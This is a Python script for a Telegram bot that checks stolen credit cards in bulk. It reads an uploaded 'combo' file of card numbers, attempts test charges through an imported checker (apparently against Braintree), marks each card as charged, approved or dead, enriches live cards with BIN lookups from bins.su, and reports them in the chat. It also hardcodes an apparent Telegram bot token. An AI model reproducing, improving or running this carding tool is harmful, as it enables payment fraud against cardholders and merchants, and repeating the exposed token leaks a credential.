import os
import requests
from bs4 import BeautifulSoup
import telebot
import random
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
import re
import pycountry
import subprocess

import time
from faker import Faker
from Strip import Check
faker = Faker()
token = "6811106358:AAGLIaSL4RaSagRZv4S3LlL0SMOgd0VSkIA" #توكنك
bot = telebot.TeleBot(token, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    os._exit(0)

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "<strong>Send the Combo TXT File \n ارسل ملف الكومبو</strong>")

@bot.message_handler(content_types=["document"])
def main(message):
    checked = 0
    live = 0
    dd = 0
    koko = bot.reply_to(message, "CHECKING STARTED  ...⌛").message_id
    file_info = bot.get_file(message.document.file_id)
    ee = bot.download_file(file_info.file_path)

    with open("combo.txt", "wb") as w:
        w.write(ee)

    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)

            for P in lino:

                try:
                    start_time = time.time()
                    res = Check(P)
                    print(res)
                except Exception as e:
                    print(e)
                    continue

                try:
                    checked += 1

                    if any(keyword in res for keyword in ["Payment success", "completed.", "redirectUrl","successfully", "payment-successfully"]):
                        live += 1
                        stay = '𝐂𝐇𝐀𝐑𝐆𝐄𝐃 $11.99 ✅'
                        rez = "Payment success"

                        infobin(P, stay, rez, start_time, message)

                    elif "Insufficient Funds" in res :
                        live += 1
                        stay = '𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅'
                        try:
                            rez = res.split('Payment error:')[1].split('"')[0]
                        except:
                            rez = ""

                        infobin(P, stay, rez, start_time, message)
                    elif "Please wait several" in res :
                        print('sleeping zzz')
                        time.sleep(40)                        
                    else:
                        dd += 1
                        stay = 'DEAD ❌'
                        try:
                            rez = res.split('Payment error:')[1].split('"')[0]  
                        except:                            
                            rez = ""

                except Exception as e:
                    print(e)
                    dd += 1

                buttons = [
                    [InlineKeyboardButton(f"💳 {[P]} 💳", callback_data='u8')],
                    [InlineKeyboardButton(f"📟 {[rez]} 📟", callback_data='u8')],
                    [InlineKeyboardButton(f"𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ ➜ [ {live} ]", callback_data='x'), InlineKeyboardButton(f"𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ ➜ [ {dd} ]", callback_data='x')],
                    [InlineKeyboardButton(f"𝐂𝐇𝐄𝐂𝐊𝐄𝐃 : [ {checked} ]", callback_data='x'), InlineKeyboardButton(f"𝐓𝐎𝐓𝐀𝐋 : [ {total} ]", callback_data='x')]
                ]
                reply_markup = InlineKeyboardMarkup(buttons)
                bot.edit_message_text(chat_id=message.chat.id, message_id=koko, text="<b>Checking your cards...</b>", parse_mode='HTML', reply_markup=reply_markup)

    except Exception as e:
        print(e)

def infobin(P, stay, rez, start_time, message):
    bin_number = P[:6]
    url = "https://bins.su"
    payload = f"action=searchbins&bins={bin_number}&bank=&country="
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; ART-L29N; HMSCore 6.13.0.321) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.5.303 Mobile Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        'Content-Type': "application/x-www-form-urlencoded",
        'Cache-Control': "max-age=0",
        'sec-ch-ua': "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"HuaweiBrowser\";v=\"99\"",
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': "\"Android\"",
        'Upgrade-Insecure-Requests': "1",
        'origin': "https://bins.su",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "navigate",
        'Sec-Fetch-User': "?1",
        'Sec-Fetch-Dest': "document",
        'Referer': "https://bins.su/",
        'Accept-Language': "ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6",
    }

    api = requests.post(url, data=payload, headers=headers)
    res = re.search(r'<div id="result">(.+?)</div>', api.text, re.DOTALL)

    if res:
        bins = re.findall(r'<tr><td>(\d+)</td><td>([A-Z]{2})</td><td>(\w+)</td><td>(\w+)</td><td>(\w+)</td><td>(.+?)</td></tr>', res.group(1))
        if bins:
            bin_number, country_code, vendor, card_type, level, bank = bins[0]
        else:
            bin_number, country_code, vendor, card_type, level, bank = "", "", "", "", "", ""
    else:
        bin_number, country_code, vendor, card_type, level, bank = "", "", "", "", "", ""

    if len(country_code) == 2 and country_code.isalpha():
        country_code = country_code.upper()
        flag_offset = 127397
        flag = ''.join(chr(ord(char) + flag_offset) for char in country_code)
    else:
        flag = ""

    try:
        country = pycountry.countries.get(alpha_2=country_code)
        country_name = country.name if country else ""
    except:
        country_name = ""

    end_time = time.time()
    duration = int(end_time - start_time)

    msg = f"""
𝗕𝗥𝗔𝗜𝗡𝐓𝗥𝗘𝗘 {stay}
𝐂𝐀𝐑𝐃 ➜ {P}
𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➜ {rez}
━━━━━━━━━━━━━━━━━
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➜ {card_type} - {level} - {vendor}
𝐈𝐒𝐒𝐔𝐄𝐑 ➜ {bank}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘➜ {country_name} {flag}
━━━━━━━━━━━━━━━━━━
𝐓𝐈𝐌𝐄 {duration}s
"""



    time.sleep(15)
    bot.reply_to(message, msg)

print('Done')
while True:
    try:
        bot.infinity_polling()
    except Exception as e:
        print(e)
        pass